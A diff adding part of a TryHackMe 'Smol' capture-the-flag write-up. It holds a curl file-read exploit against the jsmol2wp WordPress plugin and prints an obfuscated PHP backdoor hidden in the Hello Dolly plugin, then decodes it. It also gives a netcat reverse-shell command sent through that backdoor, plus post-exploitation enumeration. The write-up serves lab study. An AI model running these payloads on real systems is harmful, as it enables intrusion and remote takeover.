@@ -321,3 +321,334 @@ And voila now we got the database password and username.
 ![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo2.png){: width="972" height="589" }
 
 And we are in.
+
+
+Now lets get the reverse shell using pentestmonkey php reverse shell file.
+
+I tried to upload the php file to the wordpress with different tecniques but it didn't worked. So lets enumerate more.
+
+
+After that I found out a private webmaster tasks.
+
+
+![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo3.png){: width="972" height="589" }
+
+Which is saying that Hello Dolly plugin maybe have backdoor's in it. Lets look at the source code.
+
+We can use the same vuln we used before.
+
+```bash
+❯ curl 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php' 
+
+<?php
+/**
+ * @package Hello_Dolly
+ * @version 1.7.2
+ */
+/*
+Plugin Name: Hello Dolly
+Plugin URI: http://wordpress.org/plugins/hello-dolly/
+Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
+Author: Matt Mullenweg
+Version: 1.7.2
+Author URI: http://ma.tt/
+*/
+
+function hello_dolly_get_lyric() {
+	/** These are the lyrics to Hello Dolly */
+	$lyrics = "Hello, Dolly
+Well, hello, Dolly
+It's so nice to have you back where you belong
+You're lookin' swell, Dolly
+I can tell, Dolly
+You're still glowin', you're still crowin'
+You're still goin' strong
+I feel the room swayin'
+While the band's playin'
+One of our old favorite songs from way back when
+So, take her wrap, fellas
+Dolly, never go away again
+Hello, Dolly
+Well, hello, Dolly
+It's so nice to have you back where you belong
+You're lookin' swell, Dolly
+I can tell, Dolly
+You're still glowin', you're still crowin'
+You're still goin' strong
+I feel the room swayin'
+While the band's playin'
+One of our old favorite songs from way back when
+So, golly, gee, fellas
+Have a little faith in me, fellas
+Dolly, never go away
+Promise, you'll never go away
+Dolly'll never go away again";
+
+	// Here we split it into lines.
+	$lyrics = explode( "\n", $lyrics );
+
+	// And then randomly choose a line.
+	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
+}
+
+// This just echoes the chosen line, we'll position it later.
+function hello_dolly() {
+	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
+	
+	$chosen = hello_dolly_get_lyric();
+	$lang   = '';
+	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
+		$lang = ' lang="en"';
+	}
+
+	printf(
+		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
+		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
+		$lang,
+		$chosen
+	);
+}
+
+// Now we set that function up to execute when the admin_notices action is called.
+add_action( 'admin_notices', 'hello_dolly' );
+
+// We need some CSS to position the paragraph.
+function dolly_css() {
+	echo "
+	<style type='text/css'>
+	#dolly {
+		float: right;
+		padding: 5px 10px;
+		margin: 0;
+		font-size: 12px;
+		line-height: 1.6666;
+	}
+	.rtl #dolly {
+		float: left;
+	}
+	.block-editor-page #dolly {
+		display: none;
+	}
+	@media screen and (max-width: 782px) {
+		#dolly,
+		.rtl #dolly {
+			float: none;
+			padding-left: 0;
+			padding-right: 0;
+		}
+	}
+	</style>
+	";
+}
+
+add_action( 'admin_head', 'dolly_css' );
+```
+
+And we got the source code lets look at the source code.
+
+```php
+eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
+```
+
+And we can see this line which is base64 encoded lets convert that line.
+
+```bash
+❯ echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d
+
+ if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } %                                 
+```
+
+We still need more enumeration there is encoded things.
+
+Lets decode the variable names:
+
+```bash
+php -r 'echo "\143\155\x64" . ":" . "\143\x6d\144";'
+cmd:cmd
+```
+
+So this is basicly a backdoor we can use.
+
+But we can't directly call this plugin. We need to call this plugin somehow.
+
+
+![Desktop View](/assets/img/2025-07-04-TryHackMe-Smol/photo4.png){: width="972" height="589" }
+
+As you can see plugin calls itself on starter page.
+
+So we can use this to get reverse shell.
+
+Firstly get a reverse shell from [RevShells](https://www.revshells.com/)
+
+And change the curl command for yourself:
+
+```bash
+❯ curl 'http://www.smol.thm/wp-admin/index.php/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
+```
+
+Btw curl doesn't work in this case becouse we don't have cookies in the curl go to the browser and paste the link. And you will get reverse shell
+
+
+Lets upgrade the shell first:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+# 
+stty raw -echo;fg
+reset
+```
+
+
+And we are logged in as www-data.
+
+
+```bash
+www-data@smol:/home$ ls -la
+total 24
+drwxr-xr-x  6 root  root     4096 Aug 16  2023 .
+drwxr-xr-x 18 root  root     4096 Mar 29  2024 ..
+drwxr-x---  2 diego internal 4096 Aug 18  2023 diego
+drwxr-x---  2 gege  internal 4096 Aug 18  2023 gege
+drwxr-x---  5 think internal 4096 Jan 12  2024 think
+drwxr-x---  2 xavi  internal 4096 Aug 18  2023 xavi
+```
+
+there is a lot of users. But we can't access neither of them beacuse we are not in internal group. Lets look at the `/etc/group`
+
+
+```bash
+www-data@smol:/home$ cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog
+tty:x:5:syslog
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+systemd-timesync:x:104:
+crontab:x:105:
+messagebus:x:106:
+input:x:107:
+kvm:x:108:
+render:x:109:
+syslog:x:110:
+tss:x:111:
+uuidd:x:112:
+tcpdump:x:113:
+ssh:x:114:
+landscape:x:115:
+lxd:x:116:
+systemd-coredump:x:999:
+think:x:1000:
+fwupd-refresh:x:117:
+ssl-cert:x:118:
+mysql:x:119:
+xavi:x:1001:
+diego:x:1002:
+gege:x:1003:
+dev:x:1004:think,gege
+internal:x:1005:diego,gege,think,xavi
+```
+
+there is internal and dev group. We can use these groups later.
+Also there is mysql group.
+
+lets look at the services
+
+
+
+```bash
+www-data@smol:/home$ service --status-all
+ [ - ]  apache-htcacheclean
+ [ + ]  apache2
+ [ + ]  apparmor
+ [ + ]  apport
+ [ + ]  atd
+ [ - ]  console-setup.sh
+ [ + ]  cron
+ [ - ]  cryptdisks
+ [ - ]  cryptdisks-early
+ [ + ]  dbus
+ [ - ]  grub-common
+ [ - ]  hwclock.sh
+ [ + ]  irqbalance
+ [ - ]  iscsid
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ - ]  lvm2
+ [ - ]  lvm2-lvmpolld
+ [ + ]  multipath-tools
+ [ + ]  mysql
+ [ - ]  open-iscsi
+ [ - ]  open-vm-tools
+ [ - ]  plymouth
+ [ - ]  plymouth-log
+ [ + ]  procps
+ [ - ]  rsync
+ [ + ]  rsyslog
+ [ - ]  screen-cleanup
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  ufw
+ [ + ]  unattended-upgrades
+ [ - ]  uuidd
+```
+
+
+
+```bash
+www-data@smol:/home$ find / -type f -perm /4000 2>/dev/null
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
+```
+maybe polkit has vulns.
